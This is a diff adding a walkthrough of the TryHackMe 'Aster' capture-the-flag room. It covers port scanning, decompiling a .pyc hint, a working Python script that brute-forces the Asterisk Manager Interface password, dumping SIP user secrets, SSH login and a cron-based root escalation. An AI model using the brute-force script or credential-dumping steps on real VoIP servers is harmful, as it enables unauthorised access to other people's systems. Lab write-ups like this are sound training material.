@@ -1,0 +1,312 @@
+# Aster CTF Walkthrough (TryHackMe)
+
+## Target Information
+
+Main IP :: 10.112.171.175
+
+--------------------------------------------------
+
+## Nmap Scan
+
+Nmap scan report for 10.112.171.175
+
+Host is up (0.27s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA)
+|   256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA)
+|_  256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods:
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-title: Aster CTF
+1720/tcp open  h323q931?
+2000/tcp open  cisco-sccp?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+--------------------------------------------------
+
+## Initial Setup
+
+Add IP to /etc/hosts.
+
+--------------------------------------------------
+
+## Web Enumeration
+
+We can see NSA only file download option which is basically different.
+
+Downloaded file → output.pyc
+
+--------------------------------------------------
+
+## File Analysis (strings)
+
+We can't read that file normally so:
+
+strings output.pyc
+
+Output:
+
+A2_c
+Hello!!t
+476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722et
+ASCIIi
+476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21i"
+pyfiglett
+figlet_formatt
+o0OO00t
+oO00oOot
+bytest
+fromhext
+OOOo0t
+decodet
+Oooo000ot
+ii1IiI1it
+OOooOOot
+I11it
+o0Ot
+IiiIII111iIt
+I1Ii11I1Ii1it
+Ooot
+iii1I1It
+O00oOoOoO0o0Ot
+O0oo0OO0t
+Oo0ooO0oo0oOt
+I1i1iI1it
+./output.pyt
+<module>
+
+--------------------------------------------------
+
+## Hex Decoding
+
+Reading it with strings we get 2 long strings that are kinda hexadecimal.
+
+After decoding both we get:
+
+1. Good job, user "admin" the open source framework for building communications, installed in the server.
+2. Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
+
+--------------------------------------------------
+
+## Python Bytecode Research
+
+After research we found out this is python bytecode.
+
+--------------------------------------------------
+
+## Decompiling Python Bytecode
+
+git clone https://github.com/zrax/pycdc.git
+cd pycdc
+cmake .
+make
+
+Run:
+
+./pycdc /home/kali/thm/aster/output.pyc
+
+Output:
+
+# uncompyle6 version 3.9.3
+# Python bytecode version base 2.7 (62211)
+# Decompiled from: Python 3.13.12 (main, Feb  4 2026, 15:06:39)
+# Embedded file name: ./output.py
+# Compiled at: 2020-08-11 19:44:35
+
+import pyfiglet
+
+o0OO00 = pyfiglet.figlet_format('Hello!!')
+
+oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
+OOOo0 = bytes.fromhex(oO00oOo)
+Oooo000o = OOOo0.decode('ASCII')
+
+Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
+I1Ii11I1Ii1i = bytes.fromhex(Oo)
+Ooo = I1Ii11I1Ii1i.decode('ASCII')
+
+print o0OO00
+return
+
+--------------------------------------------------
+
+## Key Hint
+
+"open source framework for building communications"
+
+This indicates:
+
+Asterisk (VoIP communication framework)
+
+--------------------------------------------------
+
+## Further Enumeration
+
+Ran full port scan again:
+
+Nmap scan report for aster.thm (10.112.171.175)
+
+PORT     STATE SERVICE  VERSION
+5038/tcp open  asterisk Asterisk Call Manager 5.0.2
+
+--------------------------------------------------
+
+## Asterisk Manager Interface
+
+Visiting / connecting:
+
+Asterisk Call Manager/5.0.2
+Response: Error
+Message: Missing action in request
+
+--------------------------------------------------
+
+## Reference
+
+https://www.voip-info.org/asterisk-manager-example-login/
+
+--------------------------------------------------
+
+## Brute Force Script
+
+import socket
+
+host = "<DEPLOYED_MACHINE_IP>"
+port = 5038
+
+with open("rockyou.txt") as f:
+    for line in f:
+        passw = line.replace("\n","")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        s.recv(1024)
+
+        string = "ACTION: LOGIN\nUSERNAME: admin\nSECRET: {}\nEVENTS: ON\n\n".format(passw)
+
+        print(string)
+
+        s.sendall(str.encode(string))
+
+        result = s.recv(1024)
+
+        print(result.decode("utf-8"))
+        if(not "failed" in result.decode("utf-8")):
+            print(passw + " is the password")
+            break
+
+        s.close()
+
+--------------------------------------------------
+
+## Credentials Found
+
+Response: Success
+Message: Authentication accepted
+
+Password: abc123
+
+--------------------------------------------------
+
+## AMI Login
+
+telnet 10.112.171.175 5038
+
+Action: Login
+Username: admin
+Secret: abc123
+Events: On
+
+Response: Success
+
+--------------------------------------------------
+
+## SIP Enumeration
+
+action:command
+command:sip show users
+
+Output:
+
+Username    Secret
+100         100
+101         101
+harry       p4ss#w0rd!#
+
+--------------------------------------------------
+
+## SSH Access
+
+Login as:
+
+harry : p4ss#w0rd!#
+
+Retrieve user.txt
+
+--------------------------------------------------
+
+## Privilege Escalation
+
+Found file:
+
+Example_root.jar
+
+Unzip it → Example_Root.class
+
+--------------------------------------------------
+
+## Ghidra Analysis
+
+void main(String[] param1)
+
+{
+  File objectRef;
+  boolean bVar1;
+
+  objectRef = new File("/tmp/flag.dat");
+  bVar1 = Example_Root.isFileExists(objectRef);
+
+  if (bVar1) {
+    FileWriter objectRef_01 = new FileWriter("/home/harry/root.txt");
+    objectRef_01.write("my secret <3 baby");
+    objectRef_01.close();
+  }
+}
+
+--------------------------------------------------
+
+## Exploitation
+
+There is a cron job running as root.
+
+It checks if /tmp/flag.dat exists.
+
+Exploit:
+
+touch /tmp/flag.dat
+
+--------------------------------------------------
+
+## Root Flag
+
+After cron execution:
+
+cat /home/harry/root.txt
+
+--------------------------------------------------
+
+## Final Summary
+
+- Analyzed .pyc file using strings and decompilation
+- Extracted hint pointing to Asterisk
+- Discovered AMI service on port 5038
+- Brute forced credentials
+- Enumerated SIP users
+- SSH access as harry
+- Reverse engineered JAR file
+- Exploited cron job
+- Got root access
